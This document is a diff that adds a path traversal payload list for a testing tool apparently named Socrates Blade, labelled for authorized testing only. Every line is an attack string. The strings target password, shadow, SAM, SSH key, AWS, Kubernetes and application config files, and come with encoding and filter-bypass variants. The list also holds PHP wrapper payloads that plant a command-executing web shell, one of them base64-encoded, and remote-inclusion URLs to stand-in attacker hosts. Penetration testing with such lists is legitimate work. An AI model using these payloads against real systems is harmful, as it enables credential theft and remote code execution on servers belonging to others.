@@ -1,0 +1,139 @@
+# Path Traversal Payloads for Socrates Blade v3.2
+# These payloads are for authorized security testing only
+# Format: One payload per line, lines starting with # are comments
+
+# Unix/Linux basic traversal
+../../../../etc/passwd
+../../../../etc/passwd%00
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/group
+../../../../etc/my.cnf
+../../../../etc/mysql/my.cnf
+../../../../var/www/html/index.php
+../../../../var/www/config.php
+../../../../home/.bashrc
+../../../../root/.bash_history
+../../../../usr/local/etc/php/php.ini
+
+# Windows basic traversal
+..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\..\\windows\\system32\\config\\sam
+..\\..\\..\\..\\windows\\win.ini
+..\\..\\..\\..\\windows\\system32\\cmd.exe
+..\\..\\..\\..\\winnt\\system32\\cmd.exe
+
+# Double encoding traversal
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+..%255F..%255F..%255F..%255Fetc%255Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# URL encoding traversal
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Ccmd.exe
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%etc/passwd
+
+# Unicode/UTF-8 encoding
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
+
+# Null byte injection (older systems)
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd%00
+..%00../..%00../etc/passwd
+
+# Multiple encoding layers
+....//....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+
+# Filter bypass with path normalization
+..././..././..././..././etc/passwd
+..;/..;/..;/..;/..;/etc/passwd
+..%252e%252f..%252e%252f..%252e%252f..%252e%252fetc%252fpasswd
+
+# Absolute path injection
+/etc/passwd
+/etc/shadow
+/var/www/html/config.php
+/home/www-data/.ssh/authorized_keys
+/proc/self/environ
+/proc/version
+/proc/cmdline
+
+# Path traversal with null bytes (legacy)
+../../../etc/passwd%00.php
+../../../etc/passwd\x00.php
+../../../etc/passwd%00.jpg
+
+# 40-character traversal (specific to certain filters)
+../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../etc/shadow
+
+# PHP wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://input
+php://input (POST: <?php system($_GET['cmd']); ?>)
+php://stdin
+expect://ls
+zip://uploads/shell.jpg%23shell.php
+
+# Data URI with file inclusion
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# Remote file inclusion candidates (when combined with other vulns)
+http://evil.com/shell.txt
+http://evil.com/shell.php
+https://attacker.com/malicious.txt
+
+# Log file injection
+../../../../../../../var/log/apache2/access.log
+../../../../../../../var/log/nginx/access.log
+../../../../../../../var/log/httpd/access_log
+../../../xampp/apache/logs/access.log
+
+# SSH authorized keys path
+../../../../.ssh/authorized_keys
+../../../../.ssh/id_rsa
+../../../../.ssh/id_rsa.pub
+
+# Application-specific paths
+../../../../../../../../app/config/database.php
+../../../../../../../../application/config.php
+../../../../../../../../wp-config.php
+../../../../../../../../joomla/configuration.php
+../../../../../../../../drupal/sites/default/settings.php
+../../../../../../../../codeigniter/application/config/config.php
+
+# Session files
+../../../../../../../../tmp/sess_[SESSIONID]
+../../../../../../../../var/lib/php/sessions/sess_[SESSIONID]
+
+# Database files
+../../../../../../../../var/lib/mysql/mysql/user.MYD
+../../../../../../../../sqldata/app.db
+../../../../../../../../data/site.db3
+
+# Template/engine files
+../../../../../../../../smarty/templates_c/../../../etc/passwd
+../../../../../../../../twig/cache/../../../etc/passwd
+
+# Git/config files
+../../../../../../../../.git/config
+../../../../../../../../.git/HEAD
+../../../../../../../../.env
+../../../../../../../../.htaccess
+../../../../../../../../composer.json
+
+# Docker/Kubernetes paths
+../../../../../../../../.docker/config.json
+../../../../../../../../var/run/docker.sock
+../../../../../../../../.kube/config
+
+# AWS credentials paths
+../../../../../../../../.aws/credentials
+../../../../../../../../.aws/config
+../../../../../../../../.ssh/aws_keys
